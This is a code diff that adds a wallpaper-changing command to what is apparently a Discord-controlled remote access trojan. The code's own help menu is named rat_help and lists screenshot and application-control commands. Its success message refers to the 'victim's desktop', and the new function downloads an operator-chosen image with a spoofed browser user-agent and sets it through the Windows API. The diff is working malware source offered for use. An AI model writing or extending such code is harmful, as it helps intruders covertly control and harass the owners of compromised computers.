@@ -539,6 +539,65 @@ async def take_screenshot(ctx, name: Optional[str] = None):
         )
         await ctx.send(embed=embed)
 
+@bot.command(name='background', aliases=['wallpaper', 'setbackground', 'setwallpaper'])
+@is_authorized()
+async def set_background(ctx, url: Optional[str] = None):
+    try:
+        image_url = None
+        if ctx.message.attachments:
+            image_url = ctx.message.attachments[0].url
+        elif url:
+            image_url = url.strip("<>")
+
+        if not image_url:
+            await send_embed(
+                ctx,
+                "Background Error",
+                f"Please attach an image or provide an image URL.\n**Usage:** `{Config.PREFIX}background <url>` or send `{Config.PREFIX}background` with an image attached.",
+                discord.Color.orange()
+            )
+            return
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+        response = requests.get(image_url, headers=headers, timeout=15)
+        if response.status_code != 200:
+            await send_embed(ctx, "Background Error", f"Failed to download image (HTTP Status: {response.status_code})", discord.Color.red())
+            return
+
+        temp_dir = os.environ.get("TEMP", os.path.dirname(os.path.abspath(__file__)))
+        file_path = os.path.join(temp_dir, f"wallpaper_{int(time.time())}.jpg")
+
+        with open(file_path, "wb") as f:
+            f.write(response.content)
+
+        # Set Windows wallpaper
+        SPI_SETDESKWALLPAPER = 20
+        SPIF_UPDATEINIFILE = 1
+        SPIF_SENDCHANGE = 2
+
+        result = ctypes.windll.user32.SystemParametersInfoW(
+            SPI_SETDESKWALLPAPER,
+            0,
+            os.path.abspath(file_path),
+            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
+        )
+
+        if result:
+            embed = discord.Embed(
+                title="Desktop Background Changed",
+                description="Successfully changed the victim's desktop background!",
+                color=discord.Color.green()
+            )
+            embed.set_image(url=image_url)
+            await ctx.send(embed=embed)
+        else:
+            await send_embed(ctx, "Background Error", "Failed to change wallpaper via Windows API.", discord.Color.red())
+
+    except Exception as e:
+        await send_embed(ctx, "Background Error", f"Failed to set background: {str(e)}", discord.Color.red())
+
 @bot.command(name='open')
 @is_authorized()
 async def open_application(ctx, *, app_name: str):
@@ -775,6 +834,7 @@ async def rat_help(ctx):
         ],
         "Control": [
             "`screenshot [name]` - Take screenshot",
+            "`background [url/image]` - Change desktop wallpaper",
             "`open <app>` - Open application",
             "`close <app>` - Close application",
             "`listapps [limit]` - List running apps",
